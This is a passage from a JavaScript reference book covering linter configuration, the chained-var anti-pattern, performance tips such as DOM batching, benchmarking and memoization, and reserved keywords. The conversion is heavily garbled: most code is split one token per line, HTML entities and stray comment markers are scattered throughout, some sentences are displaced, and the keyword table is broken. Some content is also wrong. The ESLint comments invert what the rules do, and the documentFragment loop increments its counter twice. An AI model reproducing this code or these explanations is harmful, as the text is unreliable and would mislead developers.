[website](http://eslint.org/docs/user-guide/getting-started) for
getting started.
A sample configuration for ESLint is as follows:
{
&quot;rules&quot;
:
{
&quot;semi&quot;
:
&lbrack;
&quot;error&quot;
,
&quot;always&quot;
&rbrack;
,
// <i>throw an error when semicolons are detected*
&quot;quotes&quot;
:
&lbrack;
&quot;error&quot;
,
&quot;double&quot;
&rbrack;
// <i>throw an error when double quotes are detected*
}
}
A sample configuration file where ALL rules are set to off, with
descriptions for what they do can be found
[here](https://gist.github.com/cletusw/e01a85e399ab563b1236).
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch102-3">Section 102.3: JSLint</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
[JSLint](http://www.jslint.com/) is the trunk from which JSHint
branched. JSLint takes a much more opinionated stance on how to write
JavaScript code, pushing you towards only using the parts [Douglas
Crockford](http://crockford.com/) deems to be its &quot;good parts&quot;, and
away from any code that Crockford believes to have a better solution.
The following StackOverflow thread may help you decide [which linter
is right for you](http://stackoverflow.com/a/6803574/6194193). While
there are differences (here are some brief comparisons between it and
[JSHint](http://www.slant.co/versus/8627/8626/%7Ejshint_vs_jslint) /
[ESLint](http://www.slant.co/versus/8628/8626/%7Eeslint_vs_jslint)),
each option is extremely customizable.
For a more information about configuring JSLint check out
[NPM](https://www.npmjs.com/package/jslint) or
[github](https://gist.github.com/bretdavidson/3189814#file-jslint-options-descriptions).
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch103">Chapter 103: Anti-patterns</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch103-1">Section 103.1: Chaining assignments in var declarations</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Chaining assignments as part of a <b>var</b> declaration will create
global variables unintentionally.
For example:
(
<b>function</b>
foo
(
)
{
<b>var</b>
a
=
b
=
0
;
}
)
(
)
console.
log
(
&apos;a: &apos;
&plus;
a
)
;
console.log
(
&apos;b: &apos;
&plus;
b
)
;
Will result in:
Uncaught ReferenceError
:
a is not defined
&apos;b: 0&apos;
In the above example, a is local but b becomes global. This is because
of the right to left evaluation of the = operator. So the above code
actually evaluated as
<b>var</b>
a
=
(
b
=
0
)
;
The correct way to chain var assignments is:
<b>var</b>
a
,
b
;
a
=
b
=
0
;
Or:
<b>var</b>
a
=
0
,
b
=
a
;
This will make sure that both a and b will be local variables.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104">Chapter 104: Performance Tips</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
JavaScript, like any language, requires us to be judicious in the use
of certain language features. Overuse of some features can decrease
performance, while some techniques can be used to increase
performance.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-1">Section 104.1: Avoid try/catch in performance-critical functions</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Some JavaScript engines (for example, the current version of Node.js
and older versions of Chrome before Ignition+turbofan) don&apos;t run the
optimizer on functions that contain a try/catch block.
If you need to handle exceptions in performance-critical code, it can
be faster in some cases to keep the try/catch in a separate function.
For example, this function will not be optimized by some
implementations:
<b>function</b>
myPerformanceCriticalFunction
(
)
{
<b>try</b>
{
// <i>do complex calculations here*
}
<b>catch</b>
(
e
)
{
console.log
(
e
)
;
}
}
However, you can refactor to move the slow code into a separate
function (that *can* be optimized) and call it from inside the <b>try</b>
block.
// <i>This function can be optimized*
<b>function</b>
doCalculations
(
)
{
// <i>do complex calculations here*
}
// <i>Still not always optimized, but it&apos;s not doing much so the
performance doesn&apos;t matter*
<b>function</b>
myPerformanceCriticalFunction
(
)
{
<b>try</b>
{
doCalculations
(
)
;
}
<b>catch</b>
(
e
)
{
console.
log
(
e
)
;
}
}
Here&apos;s a jsPerf benchmark showing the difference:
<https://jsperf.com/try-catch-deoptimization>. In the current version
of most browsers, there shouldn&apos;t be much difference if any, but in
less recent versions of Chrome and Firefox, or IE, the version that
calls a helper function inside the try/catch is likely to be faster.
Note that optimizations like this should be made carefully and with
actual evidence based on profiling your code. As
JavaScript engines get better, it could end up hurting performance
instead of helping, or making no difference at all (but complicating
the code for no reason). Whether it helps, hurts, or makes no
difference can depend on a lot of factors, so always measure the
effects on your code. That&apos;s true of all optimizations, but
especially microoptimizations like this that depend on low-level
details of the compiler/runtime.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-2">Section 104.2: Limit DOM Updates</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
A common mistake seen in JavaScript when run in a browser environment
is updating the DOM more often than necessary.
The issue here is that every update in the DOM interface causes the
browser to re-render the screen. If an update changes the layout of an
element in the page, the entire page layout needs to be re-computed,
and this is very performance-heavy even in the simplest of cases. The
process of re-drawing a page is known as *reflow* and can cause a
browser to run slowly or even become unresponsive.
The consequence of updating the document too frequently is illustrated
with the following example of adding items to a list.
<b>&lt;ul</b>
Consider the following document containing a <b>&gt;</b> element:
&lt;!
DOCTYPE html
<b>&gt;</b>
<b>&lt;</b>
<b>html</b>
<b>&gt;</b>
<b>&lt;</b>
<b>body</b>
<b>&gt;</b>
<b>&lt;</b>
<b>ul</b>
id
=
&quot;list&quot;
<b>&gt;</b>
<b>&lt;</b>
<b>/ul</b>
<b>&gt;</b>
<b>&lt;</b>
<b>/body</b>
<b>&gt;</b>
<b>&lt;</b>
<b>/html</b>
<b>&gt;</b>
We add 5000 items to the list looping 5000 times (you can try this
with a larger number on a powerful computer to increase the effect).
<b>var</b>
list
=
document.
getElementById
(
&quot;list&quot;
)
;
<b>for</b>
(
<b>var</b>
i
=
1
;
i
&lt;=
5000
;
i
++
)
{
list.
innerHTML
+=
&grave;
&lt;
li
&gt;
item &dollar;
{
i
}
&lt;
/
li
&gt;
&grave;
;
// <i>update 5000 times*
}
In this case, the performance can be improved by batching all 5000
changes in one single DOM update.
<b>var</b>
list
=
document.
getElementById
(
&quot;list&quot;
)
;
<b>var</b>
html
=
&quot;&quot;
;
<b>for</b>
(
<b>var</b>
i
=
1
;
i
&lt;=
5000
;
i
++
)
{
html
+=
&grave;
&lt;
li
&gt;
item &dollar;
{
i
}
&lt;
/
li
&gt;
&grave;
;
}
list.
innerHTML
=
html
;
// <i>update once*
[document.createDocumentFragment](https://developer.mozilla.org/en-US/docs/Web/API/Document/createDocumentFragment)
The function
[()](https://developer.mozilla.org/en-US/docs/Web/API/Document/createDocumentFragment)
can be used as a lightweight container for the HTML created by
the loop. This method is slightly faster than modifying the container
element&apos;s innerHTML property (as shown below).
<b>var</b>
list
=
document.
getElementById
(
&quot;list&quot;
)
;
<b>var</b>
fragment
=
document.
createDocumentFragment
(
)
;
<b>for</b>
(
<b>var</b>
i
=
1
;
i
&lt;=
5000
;
i
++
)
{
li
=
document.
createElement
(
&quot;li&quot;
)
;
li&period;
innerHTML
=
&quot;item &quot;
&plus;
i
;
fragment.
appendChild
(
li
)
;
i
++
;
}
list.
appendChild
(
fragment
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-3">Section 104.3: Benchmarking your code - measuring execution time</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Most performance tips are very dependent of the current state of JS
engines and are expected to be only relevant at a given time. The
fundamental law of performance optimization is that you must first
measure before trying to optimize, and measure again after a presumed
optimization.
To measure code execution time, you can use different time measurement
tools like:
[Performance](https://developer.mozilla.org/en-US/docs/Web/API/Performance)
interface that represents timing-related performance information for
the given page (only available in browsers).
[process.hrtime](https://nodejs.org/api/process.html#process_process_hrtime_time)
on Node.js gives you timing information as &lbrack;seconds, nanoseconds&rbrack;
tuples. Called without argument it returns an arbitrary time but
called with a previously returned value as argument it returns the
difference between the two executions.
console.time                        (   &quot;labelName&quot;
[Console
timers](https://developer.mozilla.org/en-US/docs/Web/API/Console/time)
) starts a timer you can use to track how long an operation takes. You
give each timer a unique label name, and may have up to 10,000 timers
running on a given page. When you call
console.timeEnd                         (   &quot;labelName&quot;
) with the same name, the browser will finish the timer for given name
and output
the time in milliseconds, that elapsed since the timer was started.
The strings passed to time() and timeEnd() must match otherwise the
timer will not finish.
Date  . now
[Date.now](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/now)
function () returns current [Timestamp](http://www.unixtimestamp.com/)
in milliseconds, which is a
[Number](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number)
representation of time since 1 January 1970 00:00:00 UTC until now.
The method now() is a static method of Date, therefore you always use
it as Date.now().
performance.now
<b>Example 1</b> using: ()
In this example we are going to calculate the elapsed time for the
execution of our function, and we are going to use the
[Performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)
method that returns a
[DOMHighResTimeStamp](https://developer.mozilla.org/en-US/docs/Web/API/DOMHighResTimeStamp),
measured in milliseconds, accurate to one thousandth of a millisecond.
<b>let</b>
startTime
,
endTime
;
<b>function</b>
myFunction
(
)
{
// <i>Slow code you want to measure*
}
// <i>Get the start time*
startTime
=
performance.
now
(
)
;
// <i>Call the time-consuming function*
myFunction
(
)
;
// <i>Get the end time*
endTime
=
performance.
now
(
)
;
// <i>The difference is how many milliseconds it took to call myFunction()*
console.
debug
(
&apos;Elapsed time:&apos;
,
(
endTime
&minus;
startTime
)
)
;
The result in console will look something like this:
Elapsed time
:
0.10000000009313226
[performance.now](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)
Usage of
[()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)
has the highest precision in browsers with accuracy to one thousandth
of a millisecond, but the lowest
[compatibility](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now#Browser_compatibility).
Date       . now
<b>Example 2</b> using: ()
In this example we are going to calculate the elapsed time for the
initialization of a big array (1 million values), and
Date                                .        now
we are going to use the () method
<b>let</b> t0 = Date.now(); // <i>stores current Timestamp in milliseconds
since 1 January 1970 00:00:00 UTC* <b>let</b> arr = &lbrack;&rbrack;; // <i>store empty
array* <b>for</b> (<b>let</b> i = 0; i &lt; 1000000; i++) { // <i>1 million
iterations* arr.push(i); // <i>push current i value*
}
console.
log
(
Date
.
now
(
)
&minus;
t0
)
;
// <i>print elapsed time between stored t0 and now*
console.time       (   &quot;label&quot;   ) &   console.timeEnd        (   &quot;label&quot;
<b>Example 3</b> using: )
console.time                               (   &quot;label&quot;
console.timeEnd                               (    &quot;label&quot;
In this example we are doing the same task as in Example 2, but we are
going to use the ) & ) methods
console.time
(
&quot;t&quot;
)
;
// <i>start new timer for label name: &quot;t&quot;*
<b>let</b>
arr
=
&lbrack;
&rbrack;
;
// <i>store empty array*
<b>for</b>
(
<b>let</b>
i
=
0
;
i
&lt;
1000000
;
i
++
)
{
// <i>1 million iterations*
arr.
push
(
i
)
;
// <i>push current i value*
}
console.
timeEnd
(
&quot;t&quot;
)
;
// <i>stop the timer for label name: &quot;t&quot; and print elapsed time*
process.hrtime
<b>Exemple 4</b> using ()
In Node.js programs this is the most precise way to measure spent
time.
<b>let</b>
start
=
process.
hrtime
(
)
;
// <i>long execution here, maybe asynchronous*
<b>let</b>
diff
=
process.
hrtime
(
start
)
;
// <i>returns for example &lbrack; 1, 2325 &rbrack;*
console.
log
(
&grave;Operation took &dollar;
{
diff
&lbrack;
0
&rbrack;
&ast;
1e9
&plus;
diff
&lbrack;
1
&rbrack;
}
nanoseconds&grave;
)
;
// <i>logs: Operation took 1000002325 nanoseconds*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-4">Section 104.4: Use a memoizer for heavy-computing functions</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
If you are building a function that may be heavy on the processor
(either clientside or serverside) you may want to consider a
<b>memoizer</b> which is a *cache of previous function executions and
their returned values*. This allows you to check if the parameters of
a function were passed before. Remember, pure functions are those that
given an input, return a corresponding unique output and don&apos;t cause
side-effects outside their scope so, you should not add memoizers to
functions that are unpredictable or depend on external resources (like
AJAX calls or randomly returned values).
Let&apos;s say I have a recursive factorial function:
<b>function</b>
fact
(
num
)
{
<b>return</b>
(
num
===
0
)
?
1
:
num
&ast;
fact
(
num
&minus;
1
)
;
}
If I pass small values from 1 to 100 for example, there would be no
problem, but once we start going deeper, we might blow up the call
stack or make the process a bit painful for the JavaScript engine
we&apos;re doing this in, especially if the engine doesn&apos;t count with
tail-call optimization (although Douglas Crockford says that native
ES6 has tail-call optimization included).
We could hard code our own dictionary from 1 to god-knows-what number
with their corresponding factorials but, I&apos;m not sure if I advise
that! Let&apos;s create a memoizer, shall we?
<b>var</b>
fact
=
(
<b>function</b>
(
)
{
<b>var</b>
cache
=
{
}
;
// <i>Initialise a memory cache object*
// <i>Use and return this function to check if val is cached*
<b>function</b>
checkCache
(
val
)
{
<b>if</b>
(
val
<b>in</b>
cache
)
{
console.
log
(
&apos;It was in the cache :D&apos;
)
;
<b>return</b>
cache
&lbrack;
val
&rbrack;
;
// <i>return cached*
}
<b>else</b>
{
cache
&lbrack;
val
&rbrack;
=
factorial
(
val
)
;
// <i>we cache it*
<b>return</b>
cache
&lbrack;
val
&rbrack;
;
// <i>and then return it</i>
}
<i>/&ast; Other alternatives for checking are:</i>
<i>&vert;&vert; cache.hasOwnProperty(val) or !!cache&lbrack;val&rbrack;</i>
<i>&vert;&vert; but wouldn&apos;t work if the results of those</i>
<i>&vert;&vert; executions were falsy values.</i>
<i>&ast;/</i>
}
// <i>We create and name the actual function to be used</i>
<b>function</b>
factorial
(
num
)
{
<b>return</b>
(
num
===
0
)
?
1
:
num
&ast;
factorial
(
num
&minus;
1
)
;
}
// <i>End of factorial function</i>
<i>/&ast; We return the function that checks, not the one</i>
<i>&vert;&vert; that computes because it happens to be recursive,</i>
<i>&vert;&vert; if it weren&apos;t you could avoid creating an extra</i>
<i>&vert;&vert; function in this self-invoking closure function.</i>
<i>&ast;/</i>
<b>return</b>
checkCache
;
}
(
)
)
;
Now we can start using it:
![](./images/image054.jpg){width="4.252083333333333in"
height="0.9909722222222223in"}

Now that I start to reflect on what I did, if I were to increment from
1 instead of decrement from <i>num</i>, I could have cached all of the
factorials from 1 to <i>num</i> in the cache recursively, but I will leave
that for you.

This is great but what if we have <b>multiple parameters</b>? This is a
problem? Not quite, we can do some nice tricks like using
JSON.stringify() on the arguments array or even a list of values that
the function will depend on (for object-oriented approaches). This is
done to generate a unique key with all the arguments and dependencies
included.

We can also create a function that &quot;memoizes&quot; other functions, using
the same scope concept as before (returning a new function that uses
the original and has access to the cache object):
<b>var</b> args
WARNING: ES6 syntax, if you don&apos;t like it, replace &hellip; with nothing
and use the =
Array . <b>prototype</b> . slice .  call   (   <b>null</b>   ,   arguments
); trick; replace const and let with var, and the other things you
already know.
<b>function</b>
memoize
(
func
)
{
<b>let</b>
cache
=
{
}
;
// <i>You can opt for not naming the function*
<b>function</b>
memoized
(
&hellip;
args
)
{
<b>const</b>
argsKey
=
JSON.
stringify
(
args
)
;
// <i>The same alternatives apply for this example*
<b>if</b>
(
argsKey
<b>in</b>
cache
)
{
console.
log
(
argsKey
&plus;
&apos; was/were in cache :D&apos;
)
;
<b>return</b>
cache
&lbrack;
argsKey
&rbrack;
;
}
<b>else</b>
{
cache
&lbrack;
argsKey
&rbrack;
=
func.
apply
(
<b>null</b>
,
args
)
;
// <i>Cache it*
<b>return</b>
cache
&lbrack;
argsKey
&rbrack;
;
// <i>And then return it*
}
}
<b>return</b>
memoized
;
// <i>Return the memoized function*
}
func.apply                        (   <b>null</b>      ,   args
Now notice that this will work for multiple arguments but won&apos;t be of
much use in object-oriented methods I think, you may need an extra
object for dependencies. Also, ) can be replaced with
func                    (     &hellip;args
) since array destructuring will send them separately instead of as an
array form. Also, just for
Function                .   <b>prototype</b>              .   apply
reference, passing an array as an argument to func won&apos;t work unless
you use as I did.
To use the above method you just:
<b>const</b>
newFunction
=
memoize
(
oldFunction
)
;
// <i>Assuming new oldFunction just sums/concatenates:*
newFunction
(
&apos;meaning of life&apos;
,
42
)
;
// <i>-&amp;quot;meaning of life42&quot;*
newFunction
(
&apos;meaning of life&apos;
,
42
)
;
// <i>again*
// <i>=&amp;lbrack;&quot;meaning of life&quot;,42&rbrack; was/were in cache :D*
// <i>-&amp;quot;meaning of life42&quot;*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-5">Section 104.5: Initializing object properties with null</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
All modern JavaScript JIT compilers trying to optimize code based on
expected object structures. Some tip from
[mdn](https://developer.mozilla.org/en-US/docs/Web/JavaScript/The_performance_hazards_of__%5B%5BPrototype%5D%5D_mutation#How_JavaScript_engines_optimize_property_accesses).
Fortunately, the objects and properties are often &quot;predictable&quot;, and
in such cases their underlying structure can also be predictable. JITs
can rely on this to make predictable accesses faster.
The best way to make object predictable is to define a whole structure
in a constructor. So if you&apos;re going to add some extra properties
after object creation, define them in a constructor with <b>null</b>.
This will help the optimizer to predict object behavior for its whole
life cycle. However all compilers have different optimizers, and the
performance increase can be different, but overall it&apos;s good practice
to define all properties in a constructor, even when their value is
not yet known.
Time for some testing. In my test, I&apos;m creating a big array of some
class instances with a for loop. Within the loop, I&apos;m assigning the
same string to all object&apos;s &quot;x&quot; property before array
initialization. If constructor initializes &quot;x&quot; property with null,
array always processes better even if it&apos;s doing extra statement.
This is code:
<b>function</b>
f1
(
)
{
<b>var</b>
P
=
<b>function</b>
(
)
{
<b>this</b>
.
value
=
1
}
;
<b>var</b>
big_array
=
<b>new</b>
Array
(
10000000
)
.
fill
(
1
)
.
map
(
(
x
,
index
)
=&gt;
{
![](./images/image055.png){width="7.486805555555556in"
height="7.072222222222222in"}
This is the result for Chrome and Firefox.
FireFox Chrome
&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&bsol;
f1 6,400 11,400
f2 1,700 9,600
As we can see, the performance improvements are very different between
the two.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-6">Section 104.6: Reuse objects rather than recreate</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>Example A</b>
<b>var</b>
i
,
a
,
b
,
len
;
a
=
{
x
:
0
,
y
:
0
}
<b>function</b>
test
(
)
{
// <i>return object created each call*
<b>return</b>
{
x
:
0
,
y
:
0
}
;
}
<b>function</b>
test1
(
a
)
{
// <i>return object supplied*
a&period;
x
=
0
;
a&period;
y
=
0
;
<b>return</b>
a
;
}
<b>for</b>
(
i
=
0
;
i
&lt;
100
;
i
++
)
{
// <i>Loop A*
b
=
test
(
)
;
}
<b>for</b>
(
i
=
0
;
i
&lt;
100
;
i
++
)
{
// <i>Loop B*
b
=
test1
(
a
)
;
}
Loop B is 4 (400%) times faster than Loop A
test
test1
It is very inefficient to create a new object in performance code.
Loop A calls function () which returns a new object every call. The
created object is discarded every iteration, Loop B calls () that
requires the object returns to be supplied. It thus uses the same
object and avoids allocation of a new object, and excessive GC hits.
(GC were not included in the performance test)
<b>Example B</b>
<b>var</b>
i
,
a
,
b
,
len
;
a
=
{
x
:
0
,
y
:
0
}
<b>function</b>
test2
(
a
)
{
<b>return</b>
{
x
:
a&period;
x
&ast;
10
,
y
:
a&period;
x
&ast;
10
}
;
}
<b>function</b>
test3
(
a
)
{
a&period;
x
=
a&period;
x
&ast;
10
;
a&period;
y
=
a&period;
y
&ast;
10
;
<b>return</b>
a
;
}
<b>for</b>
(
i
=
0
;
i
&lt;
100
;
i
++
)
{
// <i>Loop A*
b
=
test2
(
{
x
:
10
,
y
:
10
}
)
;
}
<b>for</b>
(
i
=
0
;
i
&lt;
100
;
i
++
)
{
// <i>Loop B*
a&period;
x
=
10
;
a&period;
y
=
10
;
b
=
test3
(
a
)
;
}
Loop B is 5 (500%) times faster than loop A
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-7">Section 104.7: Prefer local variables to globals, attributes, and indexed values</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
JavaScript engines first look for variables within the local scope
before extending their search to larger scopes. If the variable is an
indexed value in an array, or an attribute in an associative array, it
will first look for the parent array before it finds the contents.

This has implications when working with performance-critical code.
Take for instance a common <b>for</b> loop:

<b>var</b>
global_variable
=
0
;
<b>function</b>
foo
(
)
{
global_variable
=
0
;
<b>for</b>
(
<b>var</b>
i
=
0
;
i
&lt;
items.
length
;
i
++
)
{
global_variable
+=
items
&lbrack;
i
&rbrack;
;
}
}
For every iteration in <b>for</b> loop, the engine will lookup items,
lookup the length attribute within items, lookup items again, lookup
the value at index i of items, and then finally lookup
global_variable, first trying the local scope before checking the
global scope.
A performant rewrite of the above function is:
<b>function</b>
foo
(
)
{
<b>var</b>
local_variable
=
0
;
<b>for</b>
(
<b>var</b>
i
=
0
,
li
=
items.
length
;
i
&lt;
li
;
i
++
)
{
local_variable
+=
items
&lbrack;
i
&rbrack;
;
}
<b>return</b>
local_variable
;
}

For every iteration in the rewritten <b>for</b> loop, the engine will
lookup li, lookup items, lookup the value at index i, and lookup
local_variable, this time only needing to check the local scope.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-8">Section 104.8: Be consistent in use of Numbers</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
If the engine is able to correctly predict you&apos;re using a specific
small type for your values, it will be able to optimize the executed
code.
In this example, we&apos;ll use this trivial function summing the elements
of an array and outputting the time it took:
// <i>summing properties*
<b>var</b>
sum
=
(
<b>function</b>
(
arr
)
{
<b>var</b>
start
=
process.
hrtime
(
)
;
<b>var</b>
sum
=
0
;
<b>for</b>
(
<b>var</b>
i
=
0
;
i
&lt;
arr.
length
;
i
++
)
{
sum
+=
arr
&lbrack;
i
&rbrack;
;
}
<b>var</b>
diffSum
=
process.
hrtime
(
start
)
;
console.
log
(
&grave;Summing took &dollar;
{
diffSum
&lbrack;
0
&rbrack;
&ast;
1e9
&plus;
diffSum
&lbrack;
1
&rbrack;
}
nanoseconds&grave;
)
;
<b>return</b>
sum
;
}
)
(
arr
)
;
Let&apos;s make an array and sum the elements:
<b>var</b>
N
=
12345
,
arr
=
&lbrack;
&rbrack;
;
<b>for</b>
(
<b>var</b>
i
=
0
;
i
&lt;
N
;
i
++
)
arr
&lbrack;
i
&rbrack;
=
Math
.
random
(
)
;
Result:
Summing took 384416 nanoseconds
Now, let&apos;s do the same but with only integers:
<b>var</b>
N
=
12345
,
arr
=
&lbrack;
&rbrack;
;
<b>for</b>
(
<b>var</b>
i
=
0
;
i
&lt;
N
;
i
++
)
arr
&lbrack;
i
&rbrack;
=
Math
.
round
(
1000
&ast;
Math
.
random
(
)
)
;
Result:
Summing took 180520 nanoseconds
<b>Summing integers took half the time here.</b>
Engines don&apos;t use the same types you have in JavaScript. As you
probably know, all numbers in JavaScript are IEEE754 double precision
floating point numbers, there&apos;s no specific available representation
for integers. But engines, when they can predict you only use
integers, can use a more compact and faster to use representation, for
example, short integers.
This kind of optimization is especially important for computation or
data intensive applications.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch105">Chapter 105: Memory efficiency</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch105-1">Section 105.1: Drawback of creating true private method</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
One drawback of creating private method in JavaScript is
memory-inefficient because a copy of the private method will be
created every time a new instance is created. See this simple example.
<b>function</b>
contact
(
first
,
last
)
{
<b>this</b>
.
firstName
=
first
;
<b>this</b>
.
lastName
=
last
;
<b>this</b>
.
mobile
;
// <i>private method*
<b>var</b>
formatPhoneNumber
=
<b>function</b>
(
number
)
{
// <i>format phone number based on input*
}
;
// <i>public method*
<b>this</b>
.
setMobileNumber
=
<b>function</b>
(
number
)
{
<b>this</b>
.
mobile
=
formatPhoneNumber
(
number
)
;
}
;
}
When you create few instances, they all have a copy of
formatPhoneNumber method
<b>var</b>
rob
=
<b>new</b>
contact
(
&apos;Rob&apos;
,
&apos;Sanderson&apos;
)
;
<b>var</b>
don
=
<b>new</b>
contact
(
&apos;Donald&apos;
,
&apos;Trump&apos;
)
;
<b>var</b>
andy
=
<b>new</b>
contact
(
&apos;Andy&apos;
,
&apos;Whitehall&apos;
)
;
Thus, would be great to avoid using private method only if it&apos;s
necessary.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="chA">Appendix A: Reserved Keywords</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Certain words - so-called *keywords* - are treated specially in
JavaScript. There&apos;s a plethora of different kinds of keywords, and
they have changed in different versions of the language.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="chA-1">Section A.1: Reserved Keywords</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>JavaScript has a predefined collection of *reserved keywords* which
you cannot use as variables, labels, or function names.</b>
<b>ECMAScript 1</b> Version = 1
| <b>*A*</b>  <b>*E*</b>   | <b>*E*</b>  <b>*R*</b>   | <b>*S*</b>    |
|                         |                         | <b>*Z*</b>       |
| <b>break</b>               | export                  | super           |
| <b>case</b>                | extends                 | <b>switch</b>      |
| <b>catch</b>               | <b>false</b>               | <b>this</b>        |
| class                   | <b>finally</b>             | <b>throw</b>       |
| <b>const</b>               | <b>for</b>                 | <b>true</b>        |
<b>continuefunctiontry</b>
  debuggerif                                           <b>typeof</b>
  <b>default</b> import                                   <b>var</b>
  <b>delete</b> in                                        <b>void</b>
  do <b>new</b>                                           while
